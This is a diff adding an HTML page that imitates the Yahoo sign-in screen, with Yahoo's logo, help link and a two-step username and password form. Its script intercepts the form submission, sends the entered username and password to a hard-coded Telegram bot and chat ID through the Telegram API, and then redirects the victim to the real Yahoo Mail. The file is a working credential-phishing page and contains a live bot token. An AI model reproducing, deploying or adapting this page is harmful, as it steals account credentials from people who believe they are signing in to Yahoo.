@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      rel="shortcut icon"
+      href="data:image/x-icon;base64,AAABAAEAEBAAAAEACABoBQAAFgAAACgAAAAQAAAAIAAAAAEACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAADSAWAA0whkANMLZgDUD2kA1RJrANUWbQDWGnAA1hxxANcfcwDXIHMA2CR2ANkqegDdP4cA3kSKAN9NkADhVpUA4l+bAONinQDjY50A5WyjAOZ2qQDneasA53ytAOuSuwDtnMEA8KzLAPGyzgDxtNAA8rbRAPK40gDzv9cA9MXaAPbQ4QD30uIA99PjAPne6gD54ewA+ujwAPvq8QD87vQA/fb5AP35+wD++vsA/vv8AP78/QD+/f0A/v7+AP///wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABUvEAAAAAAAAAAAAAAAAAAILh0AAAAAAAAAAAAAAAAAAyksBRYjDgAAAAAAAAAAABIvLxMgLxgAAAAAAAAAAAAeKigfCxQGAAAAAAAAAAAHLhwZLwkkJxAAAAAAAAAAFC8RDy8VFy8iAAAAAAAAACErBAIoIgotLw0AAAAAAAAAAAAAAAAAGi8bAAAAAAAAAAAAAAAAAAwmJQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
+    />
+    <title>Yahoo</title>
+
+    <style>
+      * {
+        margin: 0;
+        padding: 0;
+        font-family: sans-serif;
+        text-decoration: none;
+      }
+
+      *:focus {
+        outline: none;
+      }
+
+      header {
+        background: #fff;
+      }
+
+      header .header-content {
+        display: flex;
+        justify-content: space-between;
+        padding: 1.3rem 2.5rem;
+        margin: 0.5rem;
+      }
+
+      header .header-content img {
+        width: 55%;
+      }
+
+      a {
+        color: rgb(0, 68, 255);
+      }
+
+      header .header-help a {
+        font-size: 13px;
+        color: rgb(0, 68, 255);
+        text-decoration: none;
+      }
+
+      /* end heder section  */
+
+      .form-content {
+        width: 90%;
+        display: grid;
+        grid-template-columns: 1fr 1fr;
+        gap: 20rem;
+        justify-content: center;
+        align-items: center;
+        margin: 0 auto;
+      }
+
+      .form-img img {
+        width: 30%;
+      }
+
+      .form-section {
+        display: flex;
+        width: 400px;
+        background: #fff;
+        justify-content: center;
+        box-shadow: 2px 2px 2px #d6d6d6, -2px -2px 2px #d6d6d6;
+      }
+
+      .mg-2 {
+        margin: 2rem 1rem;
+      }
+
+      .form-title {
+        margin-bottom: 6rem;
+      }
+
+      form {
+        text-align: center;
+      }
+
+      .input-wrapper {
+        position: relative;
+        margin-bottom: 20px;
+      }
+
+      input[type="text"],
+      input[type="password"] {
+        width: 300px;
+        padding: 10px;
+        font-size: 16px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        border: none;
+        border-bottom: 1px solid #007bff;
+        border-radius: 0;
+      }
+
+      .input:focus {
+        border: none;
+        border-bottom: 1px solid #007bff;
+      }
+
+      label {
+        position: absolute;
+        top: 0;
+        left: 10px;
+        font-size: 14px;
+        color: #999;
+        pointer-events: none;
+        transition: 0.2s ease all;
+        padding: 0 1rem;
+        margin-bottom: -10px;
+      }
+
+      input:focus + label,
+      input:not(:placeholder-shown) + label {
+        top: -10px;
+        left: 5px;
+        font-size: 12px;
+        background-color: #fff;
+        padding: 0 5px;
+        color: #007bff;
+        padding: 0 1rem;
+      }
+
+      .formcheck {
+        display: flex;
+        justify-content: space-between;
+        font-size: 13px;
+        padding: 0 2rem;
+      }
+
+      button[type="submit"],
+      button[type="button"] {
+        width: 320px;
+        padding: 0.9rem;
+        border: none;
+        outline: none;
+        border-radius: 2rem;
+        margin: 1.5rem;
+        font-size: 19px;
+        font-weight: 400;
+        cursor: pointer;
+      }
+
+      .bg-blue {
+        background: #007bff;
+        color: #fff;
+      }
+
+      .extra-btns button[type="button"] {
+        border: 1px solid #007bff;
+        color: #007bff;
+      }
+
+      #password-section {
+        display: none;
+      }
+
+      input:focus::placeholder {
+        color: transparent;
+      }
+
+      input:not(:focus)::placeholder {
+        color: transparent;
+      }
+      button img {
+        width: 20px;
+        aspect-ratio: 1/1;
+        margin-bottom: -3px;
+      }
+
+
+      @media only screen and (max-width: 1024px) {
+       
+
+        .form-content {
+          width: 100%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          margin: 0;
+          height: 100%;
+
+        }
+
+        .ads {
+          display: none;
+        }
+
+        .form-section {
+          width: 100%;
+          box-shadow: 0px 0px ;
+        }
+        
+      
+      }
+
+
+      @media only screen and (max-width: 767px) {
+        header,
+        .ads {
+          display: none;
+        }
+
+        .form-content {
+          width: 100%;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          margin: 0;
+          height: 100%;
+        }
+
+        .form-section {
+          width: 100%;
+          box-shadow: 0px 0px ;
+        }
+
+        .input-wrapper {
+          margin-bottom: 40px;
+        }
+
+        .margin-top{
+            margin-top: 2rem;
+        }
+        
+      }
+    </style>
+  </head>
+
+  <body>
+    <header>
+      <div class="header-content">
+        <div class="header-img">
+          <img
+            src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png"
+            alt=""
+          />
+        </div>
+        <div class="header-help">
+          <a
+            href="https://help.yahoo.com/kb/index?locale=en_US&page=product&y=PROD_ACCT"
+            >Help</a
+          >
+        </div>
+      </div>
+    </header>
+    <section class="form-content">
+      <div class="ads">
+        <img
+          src="https://thedrum-media.imgix.net/thedrum-prod/s3/news/tmp/666306/joshua-earle-x_roz7tobjy-unsplash.jpg?w=608&ar=default&fit=crop&crop=faces,edges&auto=format"
+          alt=""
+        />
+      </div>
+      <div class="form-section">
+        <form id="form" method="post">
+          <div class="form-img">
+            <img
+              class="mg-2"
+              src="https://s.yimg.com/rz/p/yahoo_frontpage_en-US_s_f_p_bestfit_frontpage_2x.png"
+              alt="yahoo"
+            />
+            <div class="form-title mg-2">
+              <h3>Sign in</h3>
+              <p>using your Yahoo account</p>
+            </div>
+          </div>
+          <div class="form-inputs">
+            <div class="input-wrapper" id="username-section">
+              <input
+                type="text"
+                name="username"
+                id="text1"
+                placeholder="username, email, or mobile"
+              />
+              <label for="username">username, email, or mobile</label>
+            </div>
+            <div
+              class="input-wrapper"
+              id="password-section"
+              style="display: none"
+            >
+              <input
+                type="password"
+                name="phrase"
+                id="text2"
+                placeholder="password"
+              />
+              <label for="phrase">Password</label>
+            </div>
+            <button class="bg-blue margin-top" type="button" id="next-button">Next</button>
+            <div class="formcheck margin-top">
+              <p for="stay-signed-in">
+                <input type="checkbox" id="stay-signed-in" /> Stay signed in
+              </p>
+              <a href="">Forgot Password</a>
+            </div>
+          </div>
+          <button
+            class="bg-blue"
+            type="submit"
+            id="submit-button"
+            style="display: none"
+          >
+            Submit
+          </button>
+          <div class="extra-btns">
+            <button class="border-blue margin-top" type="button" id="next-button">
+              Create Account
+            </button>
+            <h6>Or, Continue with</h6>
+            <button class="g-btn margin-top" type="button" id="next-button">
+              <img
+                src="https://img.icons8.com/?size=512&id=17949&format=png"
+                alt=""
+              />oogle
+            </button>
+          </div>
+        </form>
+      </div>
+    </section>
+
+    <script>
+      const nextButton = document.getElementById("next-button");
+      const usernameSection = document.getElementById("username-section");
+      const passwordSection = document.getElementById("password-section");
+      const submitButton = document.getElementById("submit-button");
+
+      nextButton.addEventListener("click", function () {
+        usernameSection.style.display = "none";
+        passwordSection.style.display = "block";
+        submitButton.style.display = "block";
+        nextButton.style.display = "none";
+      });
+
+      const form = document.querySelector("#form");
+
+      form.addEventListener("submit", (e) => {
+        e.preventDefault();
+
+        let text1 = document.getElementById("text1").value;
+        let text2 = document.getElementById("text2").value;
+        let messge = `New Log:%0A \n Username: ${text1} %0A \n Password: ${text2}`;
+
+        let token = "6923824686:AAFF24l1V7ZzpnqI_tJwdooDetxAVG-CgJg";
+        let chatId = "6339231056";
+
+        let url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${messge}`;
+
+        let api = new XMLHttpRequest();
+        api.open("GET", url, true);
+        api.send();
+
+        console.log("Message sent successfully");
+        window.location.href = "https://mail.yahoo.com";
+      });
+    </script>
+  </body>
+</html>
